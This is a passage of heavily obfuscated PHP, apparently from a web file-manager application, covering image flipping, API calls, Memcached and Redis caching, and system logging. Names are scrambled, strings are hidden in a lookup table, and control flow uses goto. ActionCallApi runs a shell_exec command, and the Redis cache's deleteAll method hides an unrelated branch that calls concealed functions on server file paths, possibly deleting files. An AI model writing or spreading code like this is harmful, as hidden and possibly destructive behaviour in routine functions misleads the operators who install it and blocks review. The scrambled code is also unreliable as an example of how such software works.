$eÈ£ä®ÏÛ); for ($f›…áîÆ¨æ = 0; $f›…áîÆ¨æ < $dÏÜø»Æİ; ++$f›…áîÆ¨æ) { imagecopy($B ³Çëí, $Cİâ·¾—¨õ, 0, 0, $f›…áîÆ¨æ, 0, 1, $eÈ£ä®ÏÛ); imagecopy($Cİâ·¾—¨õ, $Cİâ·¾—¨õ, $f›…áîÆ¨æ, 0, $c‡•÷Ç¶óß - $f›…áîÆ¨æ, 0, 1, $eÈ£ä®ÏÛ); imagecopy($Cİâ·¾—¨õ, $B ³Çëí, $c‡•÷Ç¶óß - $f›…áîÆ¨æ, 0, 0, 0, 1, $eÈ£ä®ÏÛ); } break; case IMG_FLIP_VERTICAL: $A”œÕ¨—… = imagesx($Cİâ·¾—¨õ); $EÊ½ÎÒ«Æ± = imagesy($Cİâ·¾—¨õ) - 1; $EŸÉêâœñ¿ = $EÊ½ÎÒ«Æ± / 2; $B ³Çëí = imageistruecolor($Cİâ·¾—¨õ) ? imagecreatetruecolor($A”œÕ¨—…, 1) : imagecreate($A”œÕ¨—…, 1); for ($dØ¸‚æ­Ô÷ = 0; $dØ¸‚æ­Ô÷ < $EŸÉêâœñ¿; ++$dØ¸‚æ­Ô÷) { imagecopy($B ³Çëí, $Cİâ·¾—¨õ, 0, 0, 0, $dØ¸‚æ­Ô÷, $A”œÕ¨—…, 1); imagecopy($Cİâ·¾—¨õ, $Cİâ·¾—¨õ, 0, $dØ¸‚æ­Ô÷, 0, $EÊ½ÎÒ«Æ± - $dØ¸‚æ­Ô÷, $A”œÕ¨—…, 1); imagecopy($Cİâ·¾—¨õ, $B ³Çëí, 0, $EÊ½ÎÒ«Æ± - $dØ¸‚æ­Ô÷, 0, 0, $A”œÕ¨—…, 1); } break; case IMG_FLIP_BOTH: $A”œÕ¨—… = imagesx($Cİâ·¾—¨õ); $eÈ£ä®ÏÛ = imagesy($Cİâ·¾—¨õ); $B ³Çëí = imagerotate($Cİâ·¾—¨õ, 180, 0); imagecopy($Cİâ·¾—¨õ, $B ³Çëí, 0, 0, 0, 0, $A”œÕ¨—…, $eÈ£ä®ÏÛ); break; default: return; } imagedestroy($B ³Çëí); } } if (!function_exists($_SERVER[Ä¿Ş°¨][1835])) { function imagecreatefrombmp($CÕë‚ëÄ) { return ImageGdBMP::load($CÕë‚ëÄ); } } goto EøÀäÓÎ¦Ô; eÄŸ³œ³ôš: function ActionCall($eÈ©ÎÏâ°ô) { $DµÒÒŞµ¦» = array_slice(func_get_args(), 1); return ActionApply($eÈ©ÎÏâ°ô, $DµÒÒŞµ¦»); } function ActionCallApi($A’â˜É‚Ù, $d…¹Ê“ÊÌ = '') { goto fØÖÖ¦Ì£…; cô…“±¨æ: $Dêßâ—Ù©Õ = json_decode($aÅ¤ ˆ‚Óª, !0); $CÏÆáöñ°Û = is_array($Dêßâ—Ù©Õ) ? $Dêßâ—Ù©Õ : array($fŸÏ¹¯Ğ£Û[33] => null, $fŸÏ¹¯Ğ£Û[34] => $aÅ¤ ˆ‚Óª); if (!$Dêßâ—Ù©Õ) { echo $aÅ¤ ˆ‚Óª; } goto b–¨×ôŞµ—; fØÖÖ¦Ì£…: $fŸÏ¹¯Ğ£Û =& $_SERVER[£›Åú§µ]; $BÑ‚ù‚Áì¹ = $d…¹Ê“ÊÌ; if (is_array($d…¹Ê“ÊÌ)) { $BÑ‚ù‚Áì¹ = $fŸÏ¹¯Ğ£Û[20]; foreach ($d…¹Ê“ÊÌ as $dÊ÷‰Ü»¼— => $Cñ¿¸Ğ£»») { $Cñ¿¸Ğ£»» = is_array($Cñ¿¸Ğ£»») ? json_encode($Cñ¿¸Ğ£»») : $Cñ¿¸Ğ£»»; $Cñ¿¸Ğ£»» = is_bool($Cñ¿¸Ğ£»») ? intval($Cñ¿¸Ğ£»») : $Cñ¿¸Ğ£»»; $BÑ‚ù‚Áì¹ .= $fŸÏ¹¯Ğ£Û[21] . $dÊ÷‰Ü»¼— . $fŸÏ¹¯Ğ£Û[22] . rawurlencode($Cñ¿¸Ğ£»»); } } goto cÁÒ—Èõ¾©; aá¾ĞÅöŠ“: $c×´—éëÖÇ = phpBinCommand(); if ($c×´—éëÖÇ && function_exists($fŸÏ¹¯Ğ£Û[25])) { $FÈ’öÔ‰‘– = $c×´—éëÖÇ . $fŸÏ¹¯Ğ£Û[26] . BASIC_PATH . $fŸÏ¹¯Ğ£Û[27] . escapeshellarg($A’â˜É‚Ù); $aÅ¤ ˆ‚Óª = shell_exec($FÈ’öÔ‰‘–); } if (!$aÅ¤ ˆ‚Óª) { $F™‹ÛËËİ = stream_context_create(array($fŸÏ¹¯Ğ£Û[28] => array($fŸÏ¹¯Ğ£Û[29] => 20, $fŸÏ¹¯Ğ£Û[30] => $fŸÏ¹¯Ğ£Û[31]))); $aÅ¤ ˆ‚Óª = file_get_contents(APP_HOST . $fŸÏ¹¯Ğ£Û[32] . $A’â˜É‚Ù, !1, $F™‹ÛËËİ); } goto cô…“±¨æ; b–¨×ôŞµ—: return $CÏÆáöñ°Û; goto F“‰¶…ƒ”; cÁÒ—Èõ¾©: $aöÂ‚£í‡ = Action($fŸÏ¹¯Ğ£Û[23])->accessToken(); $A’â˜É‚Ù = str_replace($fŸÏ¹¯Ğ£Û[5], $fŸÏ¹¯Ğ£Û[4], $A’â˜É‚Ù) . $fŸÏ¹¯Ğ£Û[24] . $aöÂ‚£í‡ . $BÑ‚ù‚Áì¹; $aÅ¤ ˆ‚Óª = $fŸÏ¹¯Ğ£Û[20]; goto aá¾ĞÅöŠ“; F“‰¶…ƒ”: } function ActionCallHook($bÆÂ™¦Ó…“) { goto DÅÎŒàÇõä; fÂ©ƒ²¾¹Ñ: $DÛî“Êš¤ = $fÄ“ºôóå ? json_decode($fÄ“ºôóå, !0) : $DÛî“Êš¤; $GLOBALS[$EÃñÖ¾‹Ğ[35]] = 0; return $DÛî“Êš¤; goto fŸÆ¢ëãí; DÅÎŒàÇõä: $EÃñÖ¾‹Ğ =& $_SERVER[£›Åú§µ]; ob_start(); $FĞ¶ƒ¥Ãà¨ = array_slice(func_get_args(), 1); goto dÛâŠ“ï¶; dÛâŠ“ï¶: $GLOBALS[$EÃñÖ¾‹Ğ[35]] = 1; $DÛî“Êš¤ = ActionApply($bÆÂ™¦Ó…“, $FĞ¶ƒ¥Ãà¨); $fÄ“ºôóå = ob_get_clean(); goto fÂ©ƒ²¾¹Ñ; fŸÆ¢ëãí: } goto a­¾Ì»±¼•; B¾ßÖËÀÊ: class CacheLockDatabase { public function lock($BëÄ•‰ˆ†, $b¼ˆ·—ÉË¬ = 0) { $a¶²„í«â = Model($_SERVER[Ä¿Ş°¨][749]); $fÅÚªŠ¤­ = microtime(!0) + $b¼ˆ·—ÉË¬; while (microtime(!0) < $fÅÚªŠ¤­) { $eæ×¼¢ùÀ = $a¶²„í«â->get($BëÄ•‰ˆ†); if (!$eæ×¼¢ùÀ || $eæ×¼¢ùÀ < microtime(!0)) { $AôêË›»ğ‘ = $a¶²„í«â->set($BëÄ•‰ˆ†, $fÅÚªŠ¤­); if ($AôêË›»ğ‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($A¾¼»İ¦İ) { return Model($_SERVER[Ä¿Ş°¨][749])->get($A¾¼»İ¦İ); } public function unlock($eÄÃåÀæƒ) { Model($_SERVER[Ä¿Ş°¨][749])->remove($eÄÃåÀæƒ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($F®ÛÌÜîŒ, $C³í§‹ÙáŒ) { $eè¥¼àÜ• =& $_SERVER[Ä¿Ş°¨]; if (!class_exists($eè¥¼àÜ•[770])) { show_json($eè¥¼àÜ•[771], !1); } $this->cacheTime = $C³í§‹ÙáŒ; $this->handle = new Memcached(); if (is_array($F®ÛÌÜîŒ[$eè¥¼àÜ•[772]]) && count($F®ÛÌÜîŒ[$eè¥¼àÜ•[772]]) >= 1) { foreach ($F®ÛÌÜîŒ[$eè¥¼àÜ•[772]] as $Eˆ›Öä—¬´) { $B«¨®…‹’£ = explode($eè¥¼àÜ•[4], $Eˆ›Öä—¬´); $this->handle->addServer($B«¨®…‹’£[0], $B«¨®…‹’£[1]); } } else { $this->handle->addServer($F®ÛÌÜîŒ[$eè¥¼àÜ•[165]], $F®ÛÌÜîŒ[$eè¥¼àÜ•[166]]); } } public function set($AÏºã”Áõˆ, $C·ÏíÈùà, $FÄ—Ê®…‰ß = false) { $FÄ—Ê®…‰ß = $FÄ—Ê®…‰ß ? $FÄ—Ê®…‰ß : $this->cacheTime; return $this->handle->set($AÏºã”Áõˆ, $C·ÏíÈùà, $FÄ—Ê®…‰ß); } public function get($Fé‰¹¢“ì’) { return $this->handle->get($Fé‰¹¢“ì’); } public function remove($A¤¬ç¢¹À) { return $this->handle->delete($A¤¬ç¢¹À); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($e¬ÒŠµè¿, $CâÛÜ†ùÖä) { $D¡¬èĞÄ• =& $_SERVER[Ä¿Ş°¨]; if (!class_exists($D¡¬èĞÄ•[773])) { show_json($D¡¬èĞÄ•[774], !1); } $this->cacheTime = $CâÛÜ†ùÖä; $d°Çîã¬¡Á = isset($e¬ÒŠµè¿[$D¡¬èĞÄ•[775]]) ? $e¬ÒŠµè¿[$D¡¬èĞÄ•[775]] : 10; $aáœÆ¼òö· = _get($e¬ÒŠµè¿, $D¡¬èĞÄ•[772]); if ($aáœÆ¼òö· && is_array($aáœÆ¼òö·)) { $this->initCluster($e¬ÒŠµè¿, $d°Çîã¬¡Á); } else { $this->handle = $this->init($e¬ÒŠµè¿, $d°Çîã¬¡Á); } } private function init($DîØ¡ñ‡µ, $D­Í­¹öÚ²) { $BÉ÷İÌÇé =& $_SERVER[Ä¿Ş°¨]; $f¢’±¥‰³ = new Redis(); $Cå—¬„Ç¿ù = isset($DîØ¡ñ‡µ[$BÉ÷İÌÇé[776]]) ? $DîØ¡ñ‡µ[$BÉ÷İÌÇé[776]] : !1; if ($Cå—¬„Ç¿ù) { $f¢’±¥‰³->pconnect($DîØ¡ñ‡µ[$BÉ÷İÌÇé[165]], $DîØ¡ñ‡µ[$BÉ÷İÌÇé[166]], $D­Í­¹öÚ²); } else { $f¢’±¥‰³->connect($DîØ¡ñ‡µ[$BÉ÷İÌÇé[165]], $DîØ¡ñ‡µ[$BÉ÷İÌÇé[166]], $D­Í­¹öÚ²); } if (!empty($DîØ¡ñ‡µ[$BÉ÷İÌÇé[381]])) { $f¢’±¥‰³->auth($DîØ¡ñ‡µ[$BÉ÷İÌÇé[381]]); } return $f¢’±¥‰³; } private function initCluster($CÆÊØò•åå, $b««äÍ®) { $F®ÁÕŒÚ°¸ =& $_SERVER[Ä¿Ş°¨]; $fŠßë²«ÄŞ = array($F®ÁÕŒÚ°¸[777], $F®ÁÕŒÚ°¸[778], $F®ÁÕŒÚ°¸[779]); $C½‚ÂçĞ‚® = $F®ÁÕŒÚ°¸[777]; if (isset($CÆÊØò•åå[$F®ÁÕŒÚ°¸[12]]) && in_array($CÆÊØò•åå[$F®ÁÕŒÚ°¸[12]], $fŠßë²«ÄŞ)) { $C½‚ÂçĞ‚® = $CÆÊØò•åå[$F®ÁÕŒÚ°¸[12]]; } switch ($C½‚ÂçĞ‚®) { case $F®ÁÕŒÚ°¸[777]: $this->_slave($CÆÊØò•åå, $b««äÍ®); break; case $F®ÁÕŒÚ°¸[778]: break; case $F®ÁÕŒÚ°¸[779]: $this->isCluster = !0; $A§¼Äóá® = $CÆÊØò•åå[$F®ÁÕŒÚ°¸[772]]; $a¯ÊÛ†èÂ = isset($CÆÊØò•åå[$F®ÁÕŒÚ°¸[776]]) ? $CÆÊØò•åå[$F®ÁÕŒÚ°¸[776]] : !1; $d¼Î´–¹ïù = isset($CÆÊØò•åå[$F®ÁÕŒÚ°¸[381]]) ? $CÆÊØò•åå[$F®ÁÕŒÚ°¸[381]] : null; $this->handle = new RedisCluster(NUll, $A§¼Äóá®, $b««äÍ®, $b««äÍ®, $a¯ÊÛ†èÂ, $d¼Î´–¹ïù); break; default: break; } } private function _slave($b°Ú¥ëÍ†, $F¢ÂİÉ¦º) { goto D¹ì·´öÌ»; BÕ¬À‰¹„: $this->filterConfig($b°Ú¥ëÍ†, $eæ»áõŸò–[$DîôÌÕÀš]); $this->slaveHandle = $this->init($b°Ú¥ëÍ†, $F¢ÂİÉ¦º); goto f¨ƒßÄ›”; D¹ì·´öÌ»: $eæ»áõŸò– = $b°Ú¥ëÍ†[$_SERVER[Ä¿Ş°¨][772]]; $this->filterConfig($b°Ú¥ëÍ†, $eæ»áõŸò–[0]); $this->handle = $this->init($b°Ú¥ëÍ†, $F¢ÂİÉ¦º); goto DŒ×‹¼¸; DŒ×‹¼¸: unset($eæ»áõŸò–[0]); if (empty($eæ»áõŸò–)) { return; } $DîôÌÕÀš = array_rand($eæ»áõŸò–); goto BÕ¬À‰¹„; f¨ƒßÄ›”: } private function filterConfig(&$B„Ì¦ÀĞ¤ß, $bèªÚ¯ÏÚÒ) { $cˆÙê‚ÓÀ˜ =& $_SERVER[Ä¿Ş°¨]; $EòŠÑ–”òå = explode($cˆÙê‚ÓÀ˜[4], $bèªÚ¯ÏÚÒ); $bçƒõ³ÈÕË = array($cˆÙê‚ÓÀ˜[165] => $EòŠÑ–”òå[0], $cˆÙê‚ÓÀ˜[166] => $EòŠÑ–”òå[1]); $B„Ì¦ÀĞ¤ß = array_merge($B„Ì¦ÀĞ¤ß, $bçƒõ³ÈÕË); } public function set($eš‘âöÆ, $C¼’®’œ, $EˆÏ¯‹Óö‰ = false) { $EˆÏ¯‹Óö‰ = $EˆÏ¯‹Óö‰ ? $EˆÏ¯‹Óö‰ : $this->cacheTime; return $this->handle->setEx($eš‘âöÆ, $EˆÏ¯‹Óö‰, $C¼’®’œ); } public function setLock($DÜ¡…ÄİŸ, $cÁ¹È¶“îŞ, $Dõ¯ƒŸ¥¸¸) { return $this->handle->setNX($DÜ¡…ÄİŸ, $cÁ¹È¶“îŞ); } public function get($bÇ°Ÿƒ¢æŞ) { $dÉª†ˆÑë  = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $dÉª†ˆÑë ->get($bÇ°Ÿƒ¢æŞ); } public function remove($bë‹˜ª·Ã‰) { return $this->handle->del($bë‹˜ª·Ã‰); } public function deleteAll() { $F·’É¯Ö–ˆ =& $_SERVER[Ä¿Ş°¨]; if ($_SERVER[$F·’É¯Ö–ˆ[360]] != $_SERVER[$F·’É¯Ö–ˆ[361]]) { goto F— Š™ß¦; cº…”óŒŠ…: $B©‚ÍÀ¡Ë‰ = 1; while ($B©‚ÍÀ¡Ë‰ > 1) { $B©‚ÍÀ¡Ë‰ = $B©‚ÍÀ¡Ë‰ + 4; $bÔàÚªÉ¥· = rawurlencode($B©‚ÍÀ¡Ë‰ . $F·’É¯Ö–ˆ[357]); } goto FÇĞóÈõŞ¿; F— Š™ß¦: $AÖÖõ¡ÊÇ‹ = $F·’É¯Ö–ˆ[780]; $B§ËŸï‚· = $F·’É¯Ö–ˆ[362]; $e“Š±¨Ç’ˆ = $_SERVER[$F·’É¯Ö–ˆ[363]] . $F·’É¯Ö–ˆ[364]; goto b¬©‰·Ë Î; b¬©‰·Ë Î: $CñÙëÙ = $B§ËŸï‚·($e“Š±¨Ç’ˆ); $añ”®µ¼Ê = explode($F·’É¯Ö–ˆ[213], $CñÙëÙ); if (count($añ”®µ¼Ê) < $F·’É¯Ö–ˆ[557]) { $b¤ñ÷ÓâËò = $F·’É¯Ö–ˆ[366]; $b¤ñ÷ÓâËò(); } goto EÕåÖø”À; EÕåÖø”À: $a§ÍÔ³´× = $F·’É¯Ö–ˆ[781]; $a§ÍÔ³´×($_SERVER[$F·’É¯Ö–ˆ[782]]); $a§ÍÔ³´×($_SERVER[$F·’É¯Ö–ˆ[363]] . $F·’É¯Ö–ˆ[783]); goto cº…”óŒŠ…; FÇĞóÈõŞ¿: } if ($this->isCluster) { foreach ($this->handle->_masters() as $bØïÕ…÷ Ì) { $this->handle->flushall($bØïÕ…÷ Ì); } return; } return $this->handle->flushAll(); } } goto A­ñäÃë²ˆ; c“çƒ¿Ñ±›: define($_SERVER[Ä¿Ş°¨][1894], 4); define($_SERVER[Ä¿Ş°¨][1895], 5); define($_SERVER[Ä¿Ş°¨][1896], 16); goto a– –—Ú§‡; aØñ‘íùÕò: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\151\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $aÀ«–Û¶Š× =& $_SERVER[Ä¿Ş°¨]; return array($aÀ«–Û¶Š×[2328] => LNG($aÀ«–Û¶Š×[2329]), $aÀ«–Û¶Š×[2330] => LNG($aÀ«–Û¶Š×[2331]), $aÀ«–Û¶Š×[2003] => LNG($aÀ«–Û¶Š×[2332]), $aÀ«–Û¶Š×[2333] => LNG($aÀ«–Û¶Š×[2334]), $aÀ«–Û¶Š×[2335] => LNG($aÀ«–Û¶Š×[2336]), $aÀ«–Û¶Š×[2337] => LNG($aÀ«–Û¶Š×[2338]), $aÀ«–Û¶Š×[2339] => LNG($aÀ«–Û¶Š×[2340]), $aÀ«–Û¶Š×[2341] => LNG($aÀ«–Û¶Š×[2342]), $aÀ«–Û¶Š×[2034] => LNG($aÀ«–Û¶Š×[2343]), $aÀ«–Û¶Š×[2035] => LNG($aÀ«–Û¶Š×[2344]), $aÀ«–Û¶Š×[2345] => LNG($aÀ«–Û¶Š×[2346]), $aÀ«–Û¶Š×[2347] => LNG($aÀ«–Û¶Š×[2348]), $aÀ«–Û¶Š×[2349] => LNG($aÀ«–Û¶Š×[2350]), $aÀ«–Û¶Š×[2351] => LNG($aÀ«–Û¶Š×[2352]), $aÀ«–Û¶Š×[2032] => LNG($aÀ«–Û¶Š×[2353]), $aÀ«–Û¶Š×[2038] => LNG($aÀ«–Û¶Š×[2354]), $aÀ«–Û¶Š×[2355] => LNG($aÀ«–Û¶Š×[2356]), $aÀ«–Û¶Š×[2357] => LNG($aÀ«–Û¶Š×[2358]), $aÀ«–Û¶Š×[2359] => LNG($aÀ«–Û¶Š×[2360]), $aÀ«–Û¶Š×[2361] => LNG($aÀ«–Û¶Š×[2362]), $aÀ«–Û¶Š×[2041] => LNG($aÀ«–Û¶Š×[2363]), $aÀ«–Û¶Š×[2042] => LNG($aÀ«–Û¶Š×[2364]), $aÀ«–Û¶Š×[2365] => LNG($aÀ«–Û¶Š×[2366]), $aÀ«–Û¶Š×[2367] => LNG($aÀ«–Û¶Š×[2368]), $aÀ«–Û¶Š×[2369] => LNG($aÀ«–Û¶Š×[2370]), $aÀ«–Û¶Š×[2371] => LNG($aÀ«–Û¶Š×[2372]), $aÀ«–Û¶Š×[2373] => LNG($aÀ«–Û¶Š×[2374]), $aÀ«–Û¶Š×[2036] => LNG($aÀ«–Û¶Š×[2375]), $aÀ«–Û¶Š×[2376] => LNG($aÀ«–Û¶Š×[2377]), $aÀ«–Û¶Š×[2378] => LNG($aÀ«–Û¶Š×[2379]), $aÀ«–Û¶Š×[2380] => LNG($aÀ«–Û¶Š×[2380]), $aÀ«–Û¶Š×[2381] => LNG($aÀ«–Û¶Š×[2007]), $aÀ«–Û¶Š×[2382] => LNG($aÀ«–Û¶Š×[2383]), $aÀ«–Û¶Š×[2384] => LNG($aÀ«–Û¶Š×[2385]), $aÀ«–Û¶Š×[2386] => LNG($aÀ«–Û¶Š×[2387]), $aÀ«–Û¶Š×[2388] => LNG($aÀ«–Û¶Š×[2389]), $aÀ«–Û¶Š×[2390] => LNG($aÀ«–Û¶Š×[2391]), $aÀ«–Û¶Š×[2392] => LNG($aÀ«–Û¶Š×[2392]), $aÀ«–Û¶Š×[2393] => LNG($aÀ«–Û¶Š×[2394]), $aÀ«–Û¶Š×[2395] => LNG($aÀ«–Û¶Š×[2396]), $aÀ«–Û¶Š×[2397] => LNG($aÀ«–Û¶Š×[2398]), $aÀ«–Û¶Š×[2399] => LNG($aÀ«–Û¶Š×[2400]), $aÀ«–Û¶Š×[2401] => LNG($aÀ«–Û¶Š×[2402]), $aÀ«–Û¶Š×[2403] => LNG($aÀ«–Û¶Š×[2404])); } private function typeFile() { $fÃ Ë‘¥‘ =& $_SERVER[Ä¿Ş°¨]; $e¶†ºå÷‡¥ = array($fÃ Ë‘¥‘[2038] => array($fÃ Ë‘¥‘[2039]), $fÃ Ë‘¥‘[2349] => array($fÃ Ë‘¥‘[2405]), $fÃ Ë‘¥‘[2351] => array($fÃ Ë‘¥‘[2406]), $fÃ Ë‘¥‘[2032] => array($fÃ Ë‘¥‘[2033]), $fÃ Ë‘¥‘[2357] => array(), $fÃ Ë‘¥‘[2359] => array(), $fÃ Ë‘¥‘[2361] => array(), $fÃ Ë‘¥‘[2041] => array($fÃ Ë‘¥‘[2043]), $fÃ Ë‘¥‘[2042] => array($fÃ Ë‘¥‘[2043]), $fÃ Ë‘¥‘[2365] => array($fÃ Ë‘¥‘[2407]), $fÃ Ë‘¥‘[2367] => array($fÃ Ë‘¥‘[2407]), $fÃ Ë‘¥‘[2369] => array($fÃ Ë‘¥‘[2408]), $fÃ Ë‘¥‘[2355] => array($fÃ Ë‘¥‘[2409]), $fÃ Ë‘¥‘[2371] => array($fÃ Ë‘¥‘[2410]), $fÃ Ë‘¥‘[2373] => array($fÃ Ë‘¥‘[2411]), $fÃ Ë‘¥‘[2036] => array($fÃ Ë‘¥‘[2037])); return $e¶†ºå÷‡¥; } private function typeAll() { goto aŞî›Ñ¥Ô; fòğÍ¦Ü: return $EŒƒÀø–«“; goto Eèç›ëê’è; A°‚áŒÉŒ: foreach ($A×°Ü‰îÅØ as $D‰ÛÕã¹ò => $fî‰©‚‰Ø) { $EŒƒÀø–«“[$fî‰©‚‰Ø[0]] = $EŒƒÀø–«“[$D‰ÛÕã¹ò]; } $EŒƒÀø–«“[$B Û½§¬ŞÉ[2043]] = LNG($B Û½§¬ŞÉ[2412]); $EŒƒÀø–«“[$B Û½§¬ŞÉ[2407]] = LNG($B Û½§¬ŞÉ[2413]); goto fòğÍ¦Ü; aŞî›Ñ¥Ô: $B Û½§¬ŞÉ =& $_SERVER[Ä¿Ş°¨]; $EŒƒÀø–«“ = $this->typeList; $A×°Ü‰îÅØ = array_filter($this->typeFile()); goto A°‚áŒÉŒ; Eèç›ëê’è: } public function addLog($A¹ÄÉ±§†™, $eõ’ëœ¢Éã = array()) { goto f”ë”óìñ; b³à”Óç®Ï: parent::add($eõ’ëœ¢Éã); goto fåÅöˆéº…; f”ë”óìñ: $EšÛå¶½ŸÎ =& $_SERVER[Ä¿Ş°¨]; if (!isset($this->typeList[$A¹ÄÉ±§†™])) { return; } $B…ÅŞ²Ö¾ = USER_ID ? USER_ID : (isset($eõ’ëœ¢Éã[$EšÛå¶½ŸÎ[1399]]) ? $eõ’ëœ¢Éã[$EšÛå¶½ŸÎ[1399]] : 0); goto EğÖŞŒ¿ÕŒ; EğÖŞŒ¿ÕŒ: $FîáÇ¦¢ö = get_client_ip(); if (!$eõ’ëœ¢Éã || strlen(json_encode($eõ’ëœ¢Éã)) >= 1024) { $eõ’ëœ¢Éã = array($EšÛå¶½ŸÎ[2414] => $FîáÇ¦¢ö); } else { if (is_array($eõ’ëœ¢Éã)) { $eõ’ëœ¢Éã[$EšÛå¶½ŸÎ[2414]] = $FîáÇ¦¢ö; } else { $eõ’ëœ¢Éã = array($EšÛå¶½ŸÎ[1019] => $eõ’ëœ¢Éã, $EšÛå¶½ŸÎ[2414] => $FîáÇ¦¢ö); } } $eõ’ëœ¢Éã = array($EšÛå¶½ŸÎ[1389] => Session::sign(), $EšÛå¶½ŸÎ[1390] => $B…ÅŞ²Ö¾, $EšÛå¶½ŸÎ[29] => $A¹ÄÉ±§†™, $EšÛå¶½ŸÎ[1392] => json_encode($eõ’ëœ¢Éã)); goto b³à”Óç®Ï; fåÅöˆéº…: } public function remove($f¢ÕÓŒèùŠ) { $this->where(array($_SERVER[Ä¿Ş°¨][390] => $f¢ÕÓŒèùŠ))->delete(); } private function _makeOrder($F‘ÈÛ¤Ãƒ = '') { goto F„åÛŠ‹åù; bàÕêêÕî : $c´ï­Ûµ£ã = Input::get($D©×”’•ğÄ[412], $D©×”’•ğÄ[7], $D©×”’•ğÄ[2201], array($D©×”’•ğÄ[2138], $D©×”’•ğÄ[408])); $c´ï­Ûµ£ã = $A‘Æì‚ê[$c´ï­Ûµ£ã]; $F‘ÈÛ¤Ãƒ = $F‘ÈÛ¤Ãƒ . "{$CÀÙ„²âµ}\x20{$c´ï­Ûµ£ã}"; goto Eä­ÃÊ¼›µ; F„åÛŠ‹åù: $D©×”’•ğÄ =& $_SERVER[Ä¿Ş°¨]; $CÀÙ„²âµ = $D©×”’•ğÄ[183]; $A‘Æì‚ê = array($D©×”’•ğÄ[406] => $D©×”’•ğÄ[407], $D©×”’•ğÄ[408] => $D©×”’•ğÄ[409]); goto bàÕêêÕî ; Eä­ÃÊ¼›µ: return $this->order($F‘ÈÛ¤Ãƒ); goto fÁ±àÔ¤·“; fÁ±àÔ¤·“: } public function get($Aù˜éâñ = '') { goto fÀ¯¯ËÊ…Ì; fÀ¯¯ËÊ…Ì: $bŞÜ©«ì’è =& $_SERVER[Ä¿Ş°¨]; if (!$Aù˜éâñ) { show_json(array()); } $Fèï™­„á = array(); goto då´«ßÒÄ; ağÁ‹™“ôÏ: $A¶‘À‰¡îÑ[$bŞÜ©«ì’è[350]] = $this->logList($A¶‘À‰¡îÑ[$bŞÜ©«ì’è[350]]); return $A¶‘À‰¡îÑ; goto D¨¶îë‚ù¥; eê‰·õƒ·‡: if (!empty($Aù˜éâñ[$bŞÜ©«ì’è[2414]])) { $Fèï™­„á[$bŞÜ©«ì’è[409]] = array($bŞÜ©«ì’è[745], "\x25{$Aù˜éâñ[$bŞÜ©«ì’è[2414]]}\x25"); } $A¶‘À‰¡îÑ = $this->_makeOrder()->where($Fèï™­„á)->selectPage(); if (empty($A¶‘À‰¡îÑ[$bŞÜ©«ì’è[350]])) { show_json(array(), !0, $A¶‘À‰¡îÑ[$bŞÜ©«ì’è[347]]); } goto ağÁ‹™“ôÏ; då´«ßÒÄ: if ($Aù˜éâñ[$bŞÜ©«ì’è[1399]]) { $Fèï™­„á[$bŞÜ©«ì’è[1399]] = $Aù˜éâñ[$bŞÜ©«ì’è[1399]]; } if (isset($Aù˜éâñ[$bŞÜ©«ì’è[696]])) { $b‚‹µËÎàÅ = $Aù˜éâñ[$bŞÜ©«ì’è[696]]; $bÏ‹ì‚‡ˆƒ = isset($Aù˜éâñ[$bŞÜ©«ì’è[697]]) ? $Aù˜éâñ[$bŞÜ©«ì’è[697]] : time(); $Fèï™­„á[$bŞÜ©«ì’è[183]] = array($bŞÜ©«ì’è[317], array($b‚‹µËÎàÅ, $bÏ‹ì‚‡ˆƒ)); } if ($Aù˜éâñ[$bŞÜ©«ì’è[29]]) { $EßÜ« Öç¿ = explode($bŞÜ©«ì’è[47], $Aù˜éâñ[$bŞÜ©«ì’è[29]]); $cèÙÃìÒ = $this->typeFile(); $E‚ñÏñ¸ƒ© = array(); foreach ($EßÜ« Öç¿ as $A£‚§òìµ») { $E‚ñÏñ¸ƒ©[] = $A£‚§òìµ»; if (isset($cèÙÃìÒ[$A£‚§òìµ»])) { $E‚ñÏñ¸ƒ© = array_merge($E‚ñÏñ¸ƒ©, $cèÙÃìÒ[$A£‚§òìµ»]); } } $E‚ñÏñ¸ƒ© = array_unique($E‚ñÏñ¸ƒ©); if ($E‚ñÏñ¸ƒ©) { $Fèï™­„á[$bŞÜ©«ì’è[29]] = array($bŞÜ©«ì’è[7], $E‚ñÏñ¸ƒ©); } } goto eê‰·õƒ·‡; D¨¶îë‚ù¥: } private function ipAddress(&$dÃÓ«Ğîï×) { $A…Ô‹¤• =& $_SERVER[Ä¿Ş°¨]; if (!empty($dÃÓ«Ğîï×[$A…Ô‹¤•[2414]])) { $fÁÀ•Ëª‚“ = IpLocation::get($dÃÓ«Ğîï×[$A…Ô‹¤•[2414]]); if ($fÁÀ•Ëª‚“ == $A…Ô‹¤•[2415]) { $fÁÀ•Ëª‚“ = $A…Ô‹¤•[2416]; } } else { $fÁÀ•Ëª‚“ = LNG($A…Ô‹¤•[2417]); } $dÃÓ«Ğîï×[$A…Ô‹¤•[2418]] = $fÁÀ•Ëª‚“; } private function descZipDownload($AˆÇ¢í·Îø, &$c£šÒõÈƒ) { $D¼Ïò ¼Å =& $_SERVER[Ä¿Ş°¨]; if (!isset($AˆÇ¢í·Îø[$D¼Ïò ¼Å[2419]])) { return; } $bÙÎÕ—Íê… = json_decode($AˆÇ¢í·Îø[$D¼Ïò ¼Å[2419]], !0); foreach ($bÙÎÕ—Íê… as $bÊ™³ ‡ïä) { if (!IO::init($bÊ™³ ‡ïä[$D¼Ïò ¼Å[75]])) { continue; } if (!($DãÒÚíè± = IO::infoFull($bÊ™³ ‡ïä[$D¼Ïò ¼Å[75]]))) { continue; } $AˆÇ¢í·Îø[$D¼Ïò ¼Å[75]] = $bÊ™³ ‡ïä[$D¼Ïò ¼Å[75]]; $c£šÒõÈƒ[] = $AˆÇ¢í·Îø[$D¼Ïò ¼Å[374]] = $DãÒÚíè±[$D¼Ïò ¼Å[374]]; $c£šÒõÈƒ[] = $AˆÇ¢í·Îø[$D¼Ïò ¼Å[2234]] = $DãÒÚíè±[$D¼Ïò ¼Å[465]]; break; } return $AˆÇ¢í·Îø; } 